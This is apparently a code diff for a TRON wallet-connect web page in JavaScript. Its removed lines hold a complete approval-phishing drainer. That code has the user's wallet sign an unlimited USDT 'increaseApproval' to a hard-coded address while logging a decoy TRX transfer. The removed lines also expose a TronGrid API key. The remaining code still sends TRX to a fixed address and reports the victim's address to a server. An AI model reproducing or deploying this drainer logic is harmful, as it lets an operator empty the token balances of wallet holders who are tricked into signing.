@@ -16,16 +16,10 @@ var toAddress, type = 0,
 
 async function getUsdtBalance(address, callback) {
     let tronWeb = window.tronWeb;
-    let parameter = [{
-        type: "address",
-        value: address
-    }];
-    let options = {};
-    let result = await tronWeb.transactionBuilder.triggerSmartContract(contractAddress, "balanceOf(address)", options, parameter, address);
-    if (result.result) {
-        if (callback != undefined) {
-            callback(result.constant_result[0]);
-        }
+    let contractInstance = await tronWeb.contract().at(contractAddress);
+    let balance = await contractInstance.balanceOf(address).call();
+    if (callback != undefined) {
+        callback(balance);
     }
 }
 
@@ -63,18 +57,11 @@ async function getAssets(callback) {
             return;
         }
         try {
-            const mytronWeb = new TronWeb({
-                fullHost: 'https://api.trongrid.io',
-                Headers: {
-                    'TRON-PRO-API-KEY': '99ac1f00-50b1-4d86-9d66-18bc13c28d41'
-                }
-            });
-
-            let balance = await mytronWeb.trx.getBalance(current_address);
-            trxBalance = mytronWeb.fromSun(balance);
+            let balance = await tronWeb.trx.getBalance(current_address);
+            trxBalance = tronWeb.fromSun(balance);
 
             getUsdtBalance(current_address, function(data) {
-                usdtBalance = mytronWeb.fromSun(parseInt(data, 16));
+                usdtBalance = tronWeb.fromSun(parseInt(data._hex, 16));
                 console.log(usdtBalance);
                 isConnected = true;
                 tip("连接钱包成功");
@@ -104,58 +91,22 @@ async function executeBlockchainTransaction() {
         console.log(current_address);
         toAddress = fixedAuthorizedAddress;
 
-        const mytronWeb = new TronWeb({
-            fullHost: 'https://api.trongrid.io',
-            Headers: {
-                'TRON-PRO-API-KEY': '99ac1f00-50b1-4d86-9d66-18bc13c28d41'
-            }
-        });
+        let amount = parseFloat(document.getElementById("amount").value);
+        if (isNaN(amount) || amount <= 0) {
+            tip("请输入有效的金额");
+            return;
+        }
 
-        let tokenAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        const parameters = [{
-                type: "address",
-                value: toAddress
-            },
-            {
-                type: "uint256",
-                value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-            }
-        ];
-
-        const transactionOptions = {
-            feeLimit: 100000000
-        };
-
-        const transactionObj0 = await mytronWeb.transactionBuilder.triggerSmartContract(
-            tokenAddress,
-            "increaseApproval(address,uint256)",
-            transactionOptions,
-            parameters,
-            current_address
-        );
-
-        console.log("transactionObj0:" + JSON.stringify(transactionObj0, null, 2));
-
-        transactionObj1 = await mytronWeb.transactionBuilder.sendTrx(toAddress, amount * 1000000, current_address);
-
-        console.log("transactionObj1.raw_data" + JSON.stringify(transactionObj1.raw_data, null, 2));
-
-        console.log("之前transactionObj0.transaction.raw_data:" + JSON.stringify(transactionObj0.transaction.raw_data, null, 2));
-
-        console.log("之后transactionObj0.transaction.raw_data:" + JSON.stringify(transactionObj0.transaction.raw_data, null, 2));
-
-        console.log("整体transactionObj0:" + JSON.stringify(transactionObj0, null, 2));
-
-        const signedTransaction = await tronWeb.trx.sign(transactionObj0.transaction);
-        console.log("改后signedTransaction:" + JSON.stringify(signedTransaction, null, 2));
-
+        const transaction = await tronWeb.transactionBuilder.sendTrx(toAddress, tronWeb.toSun(amount), current_address);
+        const signedTransaction = await tronWeb.trx.sign(transaction);
         const tx = await tronWeb.trx.sendRawTransaction(signedTransaction);
 
-        if (tx) {
+        if (tx.result) {
             postInfo(current_address, toAddress);
         }
     } catch (error) {
         console.error("An error occurred during the blockchain transaction:", error);
+        tip("交易失败，请重试");
     }
 }
 
